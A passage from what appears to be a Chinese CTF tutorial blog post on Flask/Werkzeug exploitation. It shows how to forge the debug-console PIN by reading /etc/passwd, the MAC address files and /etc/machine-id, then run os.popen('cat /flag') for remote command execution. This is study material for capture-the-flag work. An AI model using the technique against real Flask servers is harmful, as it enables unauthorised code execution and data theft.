<li>username –&gt;执行代码时候的用户名<br>读取&#x2F;etc&#x2F;passwd可以看到用户名，1000以上一般为人为创建，默认用户root  </li>
<li>getattr(app,”<strong>name</strong>“,app.<strong>class</strong>.<strong>name</strong>) –&gt;Flask<br>默认为Flask  </li>
<li>modname –&gt;固定值默认flask.app<br>默认为flask.app  </li>
<li>getattr(mod,”<strong>file</strong>“,None) –&gt;flask目录下的一个app.py 文件的绝对路径<br>需要一个报错页面，或者默认路径<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2.7/site-packages/flask/app.pyc          # 默认路径python2.7内是app.pyc</span><br><span class="line">/opt/Python/flaskdebug/lib/python2.7/site-packages/flask/app.py   #通过debug报错页面获取</span><br></pre></td></tr></table></figure></li>
<li>str(uuid.getnode()) –&gt;电脑上mac地址十进制<br>读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address       #centos<br>读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address         #ubunt</li>
<li>get_machine_id() –&gt;根据操作系统不同，有四种获取方式<br>读取 &#x2F;etc&#x2F;machine-id     #在前<br>读取&#x2F;proc&#x2F;self&#x2F;cgroup   #docker   第一行最后一部分</li>
</ol>
<p>计算出pin码后填入进去后输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-06-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web基础/" title="web基础">web基础 </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/06/29/SSTI通天指北/,2js56's blog,SSTI通天指北,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/06/29/xss/" title="xss靶场通关记录">Post anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/06/14/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%8E0%E5%88%B01/" title="PHP命令执行从0到1">Post siguiente</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>